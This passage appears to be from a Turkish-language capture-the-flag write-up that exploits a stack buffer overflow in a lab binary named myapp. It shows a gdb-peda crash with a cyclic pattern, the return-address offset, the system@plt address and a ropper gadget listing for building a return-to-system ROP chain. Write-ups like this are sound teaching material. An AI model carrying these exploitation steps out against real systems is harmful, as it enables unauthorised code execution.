<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'</span>
gdb-peda<span class="nv">$ </span>r
Starting program: /opt/Safe/myapp 
<span class="o">[</span>Detaching after vfork from child process 19211]
 12:48:22 up  4:17,  1 user,  load average: 1.86, 1.49, 1.37

What <span class="k">do </span>you want me to <span class="nb">echo </span>back? <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'</span>
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ed7924 <span class="o">(</span>&lt;__GI___libc_write+20&gt;:	cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x7ffff7fa8580 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
RSI: 0x405260 <span class="o">(</span><span class="s2">"C'</span><span class="se">\n</span><span class="s2">A%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAy"</span>...<span class="o">)</span>
RDI: 0x0 
RBP: 0x414e414138414169 <span class="o">(</span><span class="s1">'iAA8AANA'</span><span class="o">)</span>
RSP: 0x7fffffffe0e8 <span class="o">(</span><span class="s2">"AjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%N"</span>...<span class="o">)</span>
RIP: 0x4011ac <span class="o">(</span>&lt;main+77&gt;:	ret<span class="o">)</span>
R8 : 0x403 
R9 : 0x7ffff7fad500 <span class="o">(</span>0x00007ffff7fad500<span class="o">)</span>
R10: 0x4003e0 <span class="nt">--</span><span class="o">&gt;</span> 0x6972700073747570 <span class="o">(</span><span class="s1">'puts'</span><span class="o">)</span>
R11: 0x246 
R12: 0x401070 <span class="o">(</span>&lt;_start&gt;:	xor    ebp,ebp<span class="o">)</span>
R13: 0x7fffffffe1c0 <span class="o">(</span><span class="s2">"%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs</span><span class="nv">$AsnAsCAs</span><span class="s2">-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsP"</span>...<span class="o">)</span>
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x4011a1 &lt;main+66&gt;:	call   0x401030 &lt;puts@plt&gt;
   0x4011a6 &lt;main+71&gt;:	mov    eax,0x0
   0x4011ab &lt;main+76&gt;:	leave  
<span class="o">=&gt;</span> 0x4011ac &lt;main+77&gt;:	ret    
   0x4011ad:	nop    DWORD PTR <span class="o">[</span>rax]
   0x4011b0 &lt;__libc_csu_init&gt;:	push   r15
   0x4011b2 &lt;__libc_csu_init+2&gt;:	mov    r15,rdx
   0x4011b5 &lt;__libc_csu_init+5&gt;:	push   r14
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffe0e8 <span class="o">(</span><span class="s2">"AjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%N"</span>...<span class="o">)</span>
0008| 0x7fffffffe0f0 <span class="o">(</span><span class="s2">"AAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%"</span>...<span class="o">)</span>
0016| 0x7fffffffe0f8 <span class="o">(</span><span class="s2">"lAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA"</span>...<span class="o">)</span>
0024| 0x7fffffffe100 <span class="o">(</span><span class="s2">"ARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%m"</span>...<span class="o">)</span>
0032| 0x7fffffffe108 <span class="o">(</span><span class="s2">"AApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%"</span>...<span class="o">)</span>
0040| 0x7fffffffe110 <span class="o">(</span><span class="s2">"qAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA"</span>...<span class="o">)</span>
0048| 0x7fffffffe118 <span class="o">(</span><span class="s2">"AVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%r"</span>...<span class="o">)</span>
0056| 0x7fffffffe120 <span class="o">(</span><span class="s2">"AAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%"</span>...<span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac <span class="k">in </span>main <span class="o">()</span>
</code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/xg <span class="nv">$rsp</span>
0x7fffffffe0e8:	0x4f41413941416a41
gdb-peda<span class="nv">$ </span>pattern_offset 0x4f41413941416a41
5710917516646246977 found at offset: 119
</code></pre></div></div>
<h5 id="systemin-offsetini-doğrudan-alıyoruz--0x401040">systemin offsetini doğrudan alıyoruz.  0x401040</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># objdump -d myapp -M intel | grep plt                                                                                                                                  </span>
Disassembly of section .plt:
0000000000401020 &lt;.plt&gt;:
0000000000401030 &lt;puts@plt&gt;:
  40103b:	e9 e0 ff ff ff       	jmp    401020 &lt;.plt&gt;
0000000000401040 &lt;system@plt&gt;:
  40104b:	e9 d0 ff ff ff       	jmp    401020 &lt;.plt&gt;
0000000000401050 &lt;<span class="nb">printf</span>@plt&gt;:
  40105b:	e9 c0 ff ff ff       	jmp    401020 &lt;.plt&gt;
0000000000401060 &lt;gets@plt&gt;:
  40106b:	e9 b0 ff ff ff       	jmp    401020 &lt;.plt&gt;
  40116e:	e8 <span class="nb">cd </span>fe ff ff       	call   401040 &lt;system@plt&gt;
  40117f:	e8 cc fe ff ff       	call   401050 &lt;<span class="nb">printf</span>@plt&gt;
  401195:	e8 c6 fe ff ff       	call   401060 &lt;gets@plt&gt;
  4011a1:	e8 8a fe ff ff       	call   401030 &lt;puts@plt&gt;
</code></pre></div></div>
<h5 id="ropper-ile-binary-içerisindeki-rop-gadgetları-dump-ediyoruz">ropper ile binary içerisindeki rop gadgetları dump ediyoruz</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># ropper -f myapp                                                                                                                                                       root@0x67616e67</span>
<span class="o">[</span>INFO] Load gadgets from cache
<span class="o">[</span>LOAD] loading... 100%
<span class="o">[</span>LOAD] removing double gadgets... 100%



Gadgets
<span class="o">=======</span>


0x0000000000401091: adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040108a: adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010fe: adc dword ptr <span class="o">[</span>rax], edi<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401095: adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010bc: adc edi, dword ptr <span class="o">[</span>rax]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401099: add ah, dh<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401093: add bh, bh<span class="p">;</span> adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040100a: add byte ptr <span class="o">[</span>rax - 0x7b], cl<span class="p">;</span> sal byte ptr <span class="o">[</span>rdx + rax - 1], 0xd0<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010be: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401100: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004011a7: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011a8: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401212: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> sub rsp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401009: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x0000000000401009: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010c0: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401102: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401098: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011a9: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040109e: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040109d: add byte ptr <span class="o">[</span>rax], r8b<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401137: add byte ptr <span class="o">[</span>rcx], al<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011aa: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401092: add dil, dil<span class="p">;</span> adc eax, 0x2f56<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401006: add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x0000000000401006: add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401013: add esp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401012: add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011a1: call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040112d: call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401094: call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401010: call rax<span class="p">;</span> 
0x0000000000401010: call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401134: comiss xmm0, xmmword ptr <span class="o">[</span>rax]<span class="p">;</span> add byte ptr <span class="o">[</span>rcx], al<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011f4: fmul qword ptr <span class="o">[</span>rax - 0x7d]<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401002: <span class="k">in </span>al, dx<span class="p">;</span> or byte ptr <span class="o">[</span>rax - 0x75], cl<span class="p">;</span> add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x000000000040115b: <span class="k">in </span>eax, 0x90<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040100e: je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x000000000040100e: je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010bb: je 0x10d0<span class="p">;</span> mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004010c5: je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004010fd: je 0x1110<span class="p">;</span> mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401107: je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004010cc: jmp rax<span class="p">;</span> 
0x000000000040119b: lea eax, dword ptr <span class="o">[</span>rbp - 0x70]<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040119a: lea rax, qword ptr <span class="o">[</span>rbp - 0x70]<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401132: mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010bd: mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004010ff: mov eax, 0<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x00000000004011a6: mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401005: mov eax, dword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x0000000000401005: mov eax, dword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040112b: mov ebp, esp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401087: mov ecx, 0x4011b0<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040108e: mov edi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010c7: mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x000000000040119f: mov edi, eax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401004: mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x0000000000401004: mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040112a: mov rbp, rsp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401086: mov rcx, 0x4011b0<span class="p">;</span> mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040108d: mov rdi, 0x40115f<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040119e: mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040109b: nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040120d: nop dword ptr <span class="o">[</span>rax]<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401003: or byte ptr <span class="o">[</span>rax - 0x75], cl<span class="p">;</span> add eax, 0x2fed<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x00000000004010c6: or dword ptr <span class="o">[</span>rdi + 0x404048], edi<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401204: pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401206: pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401208: pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040120a: pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401203: pop rbp<span class="p">;</span> pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401207: pop rbp<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401139: pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401090: pop rdi<span class="p">;</span> adc dword ptr <span class="o">[</span>rax], eax<span class="p">;</span> call qword ptr <span class="o">[</span>rip + 0x2f56]<span class="p">;</span> hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040120b: pop rdi<span class="p">;</span> ret<span class="p">;</span> 
